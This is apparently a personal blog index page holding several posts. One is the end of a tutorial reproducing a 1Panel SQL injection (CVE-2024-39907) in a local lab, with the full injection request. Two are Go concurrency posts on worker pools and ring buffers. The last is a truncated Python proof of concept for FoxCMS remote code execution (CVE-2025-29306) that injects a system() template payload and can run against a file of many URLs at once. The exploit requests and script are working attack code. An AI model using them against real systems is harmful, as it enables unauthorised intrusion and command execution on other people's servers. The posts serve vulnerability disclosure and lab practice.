<p>At this point , when you open firefox, select Yakit in FoxyProxy, as shown in the red box below :</p>
<p><img src="/images/Yakit05.png"></p>
<p>Open localhost:10086&#x2F;entrance, enter the username and password, and you will be able to access the interface shown above.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username：1panel</span><br><span class="line">password：1panel_password</span><br></pre></td></tr></table></figure>
<p>In Yakit,we should have already captured the data packages,and now it is time for the exciting part - verifying the vulnerability.<br>First , in the packets captured by Yakit,select any packet(the packet must contain a cookie) shown in the figure below:</p>
<p><img src="/images/Yakit06.png"></p>
<p>Then, open the link related to 1Panel in Vulbox:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub/blob/master/1panel/CVE-2024-39907/README.zh-cn.md</span><br></pre></td></tr></table></figure>

<p>The packet for reproducing the vulnerability is as follows:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/hosts/command/search HTTP/1.1</span><br><span class="line">Host: your-ip:10086</span><br><span class="line">Accept-Language: zh</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</span><br><span class="line">Cookie: psession=your-session-cookie</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;page&quot;</span>:1,</span><br><span class="line">  <span class="string">&quot;pageSize&quot;</span>:10,</span><br><span class="line">  <span class="string">&quot;groupID&quot;</span>:0,</span><br><span class="line">  <span class="string">&quot;orderBy&quot;</span>:<span class="string">&quot;3;ATTACH DATABASE &#x27;/tmp/randstr.txt&#x27; AS test;create TABLE test.exp (data text);create TABLE test.exp (data text);drop table test.exp;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;order&quot;</span>:<span class="string">&quot;ascending&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>:<span class="string">&quot;a&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Modify the values of the host and Cookie fields：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/hosts/command/search HTTP/1.1</span><br><span class="line">Host: localhost:10086</span><br><span class="line">Accept-Language: zh</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</span><br><span class="line">Cookie: psession=6088e21d-0a44-4126-a561-1b7beaf4f314</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;page&quot;</span>:1,</span><br><span class="line">  <span class="string">&quot;pageSize&quot;</span>:10,</span><br><span class="line">  <span class="string">&quot;groupID&quot;</span>:0,</span><br><span class="line">  <span class="string">&quot;orderBy&quot;</span>:<span class="string">&quot;3;ATTACH DATABASE &#x27;/tmp/randstr.txt&#x27; AS test;create TABLE test.exp (data text);create TABLE test.exp (data text);drop table test.exp;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;order&quot;</span>:<span class="string">&quot;ascending&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>:<span class="string">&quot;a&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Select the packet content above and copy it. Then open the Web Fuzzer feature in Yakit and paste it into the Request section, as shown in the figure below:</p>
<p><img src="/images/Yakit07.png"></p>
<p>Click ‘Send Request’. In the response data on the right, you will see a message indicating ‘SQL logic error xxx’, as shown in the figure below:</p>
<p><img src="/images/Yakit08.png"></p>
<p>Now that you have verified in your own Docker environment that this vulnerability does in fact exist, isn’t that cool? I hope everyone enjoys their penetration testing. This concludes the article.</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/08/16/common-work-pool-in-golang/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Dong Cong">
      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="congdong007">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/08/16/common-work-pool-in-golang/" class="post-title-link" itemprop="url">Common worker pool patterns in Go</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-08-16 10:49:08 / Modified: 11:08:33" itemprop="dateCreated datePublished" datetime="2025-08-16T10:49:08-04:00">2025-08-16</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Worker-Pool/" itemprop="url" rel="index"><span itemprop="name">Worker Pool</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Worker-Pool/Go/" itemprop="url" rel="index"><span itemprop="name">Go</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ol>
<li><p>What is a Worker Pool?</p>
<ul>
<li><p>A worker pool is a concurrency pattern designed to control the number of goroutines executing tasks concurrently. Instead of spawning an unbounded goroutine for every incoming job—which may lead to excessive memory consumption and scheduler overhead—a worker pool pre-spawns a fixed number of workers (goroutines). Tasks are then dispatched to these workers via a shared queue.</p>
</li>
<li><p>Benefits:</p>
<ul>
<li><p>Limits resource usage by capping concurrency.</p>
</li>
<li><p>Prevents unbounded goroutine creation.</p>
</li>
<li><p>Provides a simple scheduling mechanism for tasks.</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Common Worker Pool Implementations in Go</p>
<ul>
<li><p>(a) Channel-Based Pool</p>
<ul>
<li><p>This is the most idiomatic and straightforward implementation.</p>
</li>
<li><p>A channel acts as a job queue.</p>
</li>
<li><p>Workers are goroutines reading from this channel.</p>
</li>
<li><p>The main function submits tasks by sending them into the channel.</p>
</li>
<li><p>Example:</p>
  <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">jobs := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">100</span>)</span><br><span class="line">results := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> w := <span class="number">0</span>; w &lt; <span class="number">3</span>; w++ &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(id <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> j := <span class="keyword">range</span> jobs &#123;</span><br><span class="line">            <span class="comment">// process job j</span></span><br><span class="line">            results &lt;- j * <span class="number">2</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;(w)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// submit jobs</span></span><br><span class="line"><span class="keyword">for</span> j := <span class="number">1</span>; j &lt;= <span class="number">5</span>; j++ &#123;</span><br><span class="line">    jobs &lt;- j</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(jobs)</span><br></pre></td></tr></table></figure>
</li>
<li><p>This approach is best for bounded tasks where the job set is known in advance.</p>
</li>
</ul>
</li>
<li><p>(b) Channel + WaitGroup Pool</p>
<ul>
<li><p>A slightly more structured approach uses a sync.WaitGroup to wait for all workers to complete.</p>
</li>
<li><p>Workers continuously read from a job channel.</p>
</li>
<li><p>A WaitGroup ensures the main goroutine blocks until all jobs are finished.</p>
</li>
<li><p>This pattern is suited for long-running pipelines where tasks keep arriving dynamically.</p>
</li>
</ul>
</li>
<li><p>(c) Encapsulated Worker Pool</p>
<ul>
<li><p>In larger applications, it’s common to encapsulate the pool into a reusable type. For example:</p>
  <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> WorkerPool <span class="keyword">struct</span> &#123;</span><br><span class="line">    tasks <span class="keyword">chan</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line">    wg    sync.WaitGroup</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewWorkerPool</span><span class="params">(n <span class="type">int</span>)</span></span> *WorkerPool &#123;</span><br><span class="line">    pool := &amp;WorkerPool&#123;tasks: <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>)&#125;</span><br><span class="line">    pool.wg.Add(n)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="keyword">defer</span> pool.wg.Done()</span><br><span class="line">            <span class="keyword">for</span> task := <span class="keyword">range</span> pool.tasks &#123;</span><br><span class="line">                task()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pool</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *WorkerPool)</span></span> Submit(task <span class="function"><span class="keyword">func</span><span class="params">()</span></span>) &#123; p.tasks &lt;- task &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *WorkerPool)</span></span> Shutdown()          &#123; <span class="built_in">close</span>(p.tasks); p.wg.Wait() &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>This design allows submitting arbitrary functions and cleanly shutting down the pool. It is often used in task scheduling systems or background workers.</p>
</li>
</ul>
</li>
<li><p>(d) Using a Library (e.g., ants)</p>
<ul>
<li><p>For production-grade performance, developers often use libraries such as ants.</p>
</li>
<li><p>Provides a high-performance worker pool with memory reuse.</p>
</li>
<li><p>Significantly reduces garbage collection (GC) overhead compared to spawning millions of goroutines.</p>
</li>
<li><p>Simple API:</p>
  <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p, _ := ants.NewPool(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">defer</span> p.Release()</span><br><span class="line"></span><br><span class="line">p.Submit(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// task logic</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>This is widely adopted in scenarios with high throughput and large task volumes.</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Summary</p>
<ul>
<li><p>Channel-based pools: idiomatic and simple, good for small-scale concurrency.</p>
</li>
<li><p>Channel + WaitGroup: suitable for dynamic task streams.</p>
</li>
<li><p>Encapsulated worker pools: reusable and flexible, used in larger systems.</p>
</li>
<li><p>Third-party libraries (e.g., ants): optimized for high performance and reduced GC load.</p>
</li>
</ul>
</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/08/16/Lock-Free-golang/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Dong Cong">
      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="congdong007">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/08/16/Lock-Free-golang/" class="post-title-link" itemprop="url">Sharded Lock-Free MPSC Ring Buffers in Golang</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-08-16 09:56:22 / Modified: 10:37:44" itemprop="dateCreated datePublished" datetime="2025-08-16T09:56:22-04:00">2025-08-16</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Go-Sharded-Lock-Free-MPSC-Ring-Buffers/" itemprop="url" rel="index"><span itemprop="name">Go -Sharded Lock-Free MPSC Ring Buffers</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ol>
<li><p>Fundamental Concepts</p>
<ul>
<li><p>Ring Buffer</p>
<ul>
<li>A ring buffer (or circular buffer) is a fixed-size queue in which the write and read pointers wrap around once they reach the end of the underlying array. It is widely used in high-performance systems such as logging pipelines, network buffers, and message queues.</li>
</ul>
</li>
<li><p>MPSC (Multi-Producer, Single-Consumer)</p>
<ul>
<li><p>An MPSC queue allows multiple producers (writers) to insert elements concurrently, while only a single consumer (reader) retrieves elements.</p>
</li>
<li><p>Write operations must address concurrent access among producers.</p>
</li>
<li><p>Read operations are simpler, as they are performed by a single consumer thread.</p>
</li>
</ul>
</li>
<li><p>Lock-Free</p>
<ul>
<li>Instead of using traditional mutexes, lock-free structures rely on atomic operations (e.g., Compare-And-Swap, CAS) to ensure correctness under concurrency. This avoids lock contention, reducing latency and improving throughput.</li>
</ul>
</li>
<li><p>Sharded</p>
<ul>
<li>A sharded design partitions a large ring buffer into several smaller independent sub-buffers (shards). Producers are distributed across shards (e.g., by hashing or thread affinity), which minimizes contention. The consumer then sequentially or cyclically retrieves items from all shards.</li>
</ul>
</li>
</ul>
</li>
<li><p>Operating Principles</p>
<p> A sharded lock-free MPSC ring buffer typically operates as follows:</p>
<ul>
<li><p>Initialization</p>
<ul>
<li><p>The total buffer capacity is divided into N shards (e.g., 8 sub-buffers).</p>
</li>
<li><p>Each shard itself is implemented as a lock-free MPSC ring buffer.</p>
</li>
</ul>
</li>
<li><p>Producer Writes (Concurrent)</p>
<ul>
<li><p>Each producer selects a shard based on a hash function, producer ID, or randomized strategy.</p>
</li>
<li><p>The producer atomically advances the write pointer in that shard using CAS and writes its data.</p>
</li>
<li><p>Because writes are distributed across shards, contention is significantly reduced.</p>
</li>
</ul>
</li>
<li><p>Consumer Reads (Single Thread)</p>
<ul>
<li><p>The consumer iterates over all shards, checking each for available entries.</p>
</li>
<li><p>Data is retrieved by advancing the shard’s read pointer.</p>
</li>
<li><p>As only one consumer exists, no synchronization overhead is required for reading.</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Motivation for Sharding</p>
<ul>
<li><p>Challenge with Conventional MPSC Buffers</p>
<ul>
<li>In a non-sharded MPSC buffer, all producers compete on a single shared write pointer, resulting in substantial contention under high concurrency.</li>
</ul>
</li>
<li><p>Benefits of Sharding</p>
<ul>
<li><p>Each shard has fewer competing producers, reducing contention on its write pointer.</p>
</li>
<li><p>The single consumer can still process data deterministically by scanning all shards.</p>
</li>
<li><p>Performance gains are particularly evident when the number of producers is large relative to the consumer.</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Application Scenarios</p>
<ul>
<li><p>High-performance logging systems (multiple threads writing logs, one thread persisting to storage).</p>
</li>
<li><p>Network servers (multiple connections producing packets, one thread aggregating and processing them).</p>
</li>
<li><p>Data acquisition systems (multiple sensors producing input, one thread consuming for analysis).</p>
</li>
</ul>
</li>
<li><p>Implementation Notes in Golang</p>
<ul>
<li><p>In Go, the sync&#x2F;atomic package is typically used for lock-free synchronization.<br> Key implementation aspects include:</p>
</li>
<li><p>Write Operation</p>
</li>
</ul>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">idx := atomic.AddUint64(&amp;shard.writePos, <span class="number">1</span>) - <span class="number">1</span></span><br><span class="line">buffer[idx % shard.size] = value</span><br></pre></td></tr></table></figure>

<ul>
<li>Read Operation (single-threaded, no CAS required)</li>
</ul>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> shard.readPos &lt; shard.writePos &#123;</span><br><span class="line">    val := buffer[shard.readPos % shard.size]</span><br><span class="line">    shard.readPos++</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Shard Selection</li>
</ul>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shardID := hash(producerID) % numShards</span><br><span class="line">shard := shards[shardID]</span><br></pre></td></tr></table></figure>

<ul>
<li>Consumer Loop</li>
</ul>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> _, shard := <span class="keyword">range</span> shards &#123;</span><br><span class="line">        <span class="keyword">if</span> val, ok := shard.TryRead(); ok &#123;</span><br><span class="line">            process(val)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Advantages and Limitations</p>
<ul>
<li><p>Advantages</p>
<ul>
<li><p>Lock-free design avoids mutex contention.</p>
</li>
<li><p>Sharding reduces producer contention and increases throughput.</p>
</li>
<li><p>Single-consumer semantics simplify design and maintain order within each shard.</p>
</li>
</ul>
</li>
<li><p>Limitations</p>
<ul>
<li><p>The consumer must poll multiple shards, which may increase latency with many shards.</p>
</li>
<li><p>Buffer utilization may be uneven if some shards are heavily loaded while others remain idle.</p>
</li>
<li><p>The design does not extend naturally to multiple consumers.</p>
</li>
</ul>
</li>
</ul>
</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/28/FoxCMS-CVE-2025-29306/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Dong Cong">
      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="congdong007">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/28/FoxCMS-CVE-2025-29306/" class="post-title-link" itemprop="url">FoxCMS v.1.2.5 allows a remote attacker to execute arbitrary code (CVE-2025-29306) POC</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-28 00:09:34 / Modified: 00:31:35" itemprop="dateCreated datePublished" datetime="2025-04-28T00:09:34-04:00">2025-04-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/vulnerability/" itemprop="url" rel="index"><span itemprop="name">vulnerability</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/vulnerability/FoxCMS-v-1-2-5/" itemprop="url" rel="index"><span itemprop="name">FoxCMS v.1.2.5</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/vulnerability/FoxCMS-v-1-2-5/CVE-2025-29306/" itemprop="url" rel="index"><span itemprop="name">CVE-2025-29306</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <pre><code>Description

Published: 2025-03-27 Updated: 2025-03-27

An issue in FoxCMS v.1.2.5 allows a remote attacker to execute arbitrary code via the case display page in the index.html component.

Scope of impact:
</code></pre>
<p>   <img src="/images/vuln12.jpg"></p>
<pre><code>Proof of Concept (Python Code)

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Title: FoxCMS v.1.2.5 allows a remote attacker to execute arbitrary code (CVE-2025-29306)</span></span><br><span class="line"><span class="comment"># Date : 2025-04-28</span></span><br><span class="line"><span class="comment"># Author: Dong Cong</span></span><br><span class="line"><span class="comment">#         </span></span><br><span class="line"><span class="comment">#         ZXJpYy5jb25nZG9uZ0BnbWFpbC5jb20=</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># CVE-2025-29306</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import urllib.parse</span><br><span class="line">import requests</span><br><span class="line">from lxml import html</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor, as_completed</span><br><span class="line">from colorama import init, Fore, Style</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize colorama</span></span><br><span class="line">init(autoreset=True)</span><br><span class="line"></span><br><span class="line">def load_urls(filename):</span><br><span class="line">    try:</span><br><span class="line">        with open(filename, <span class="string">&#x27;r&#x27;</span>) as f:</span><br><span class="line">            urls = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()]</span><br><span class="line">        <span class="built_in">return</span> urls</span><br><span class="line">    except FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(Fore.RED + f<span class="string">&quot;[-] File not found: &#123;filename&#125;&quot;</span>)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">def send_payload(target, <span class="built_in">command</span>):</span><br><span class="line">    payload = urllib.parse.quote(<span class="string">&#x27;$&#123;@print_r(@system(&quot;&#x27;</span> + <span class="built_in">command</span> + <span class="string">&#x27;&quot;))&#125;&#x27;</span>)</span><br><span class="line">    full_url = f<span class="string">&quot;&#123;target&#125;?id=&#123;payload&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(full_url, <span class="built_in">timeout</span>=10)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line">        response.encoding = response.apparent_encoding</span><br><span class="line">    except Exception as e:</span><br><span class="line">        <span class="built_in">return</span> (target, False, f<span class="string">&quot;Request error: &#123;e&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        tree = html.fromstring(response.text)</span><br><span class="line">        ul_element = tree.xpath(<span class="string">&quot;/html/body/header/div[1]/div[2]/div[1]/ul&quot;</span>)[0]</span><br><span class="line">        text_content = ul_element.text_content()</span><br><span class="line">        cleaned = <span class="string">&quot;\n&quot;</span>.<span class="built_in">join</span>([line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> text_content.splitlines() <span class="keyword">if</span> line.strip()])</span><br><span class="line">        <span class="built_in">return</span> (target, True, cleaned)</span><br><span class="line">    except IndexError:</span><br><span class="line">        <span class="built_in">return</span> (target, False, <span class="string">&quot;&lt;ul&gt; element not found at specified XPath.&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; 3:</span><br><span class="line">        <span class="built_in">print</span>(Fore.YELLOW + f<span class="string">&quot;Usage:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(Fore.YELLOW + f<span class="string">&quot;  &#123;sys.argv[0]&#125; -f &lt;url.txt&gt; &lt;command&gt;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(Fore.YELLOW + f<span class="string">&quot;  &#123;sys.argv[0]&#125; -u &lt;single_url&gt; &lt;command&gt;&quot;</span>)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    mode = sys.argv[1]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;-f&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> len(sys.argv) != 4:</span><br><span class="line">            <span class="built_in">print</span>(Fore.RED + <span class="string">&quot;[-] Incorrect usage for file mode.&quot;</span>)</span><br><span class="line">            sys.exit(1)</span><br><span class="line">        url_file = sys.argv[2]</span><br><span class="line">        <span class="built_in">command</span> = sys.argv[3]</span><br><span class="line">        urls = load_urls(url_file)</span><br><span class="line">        <span 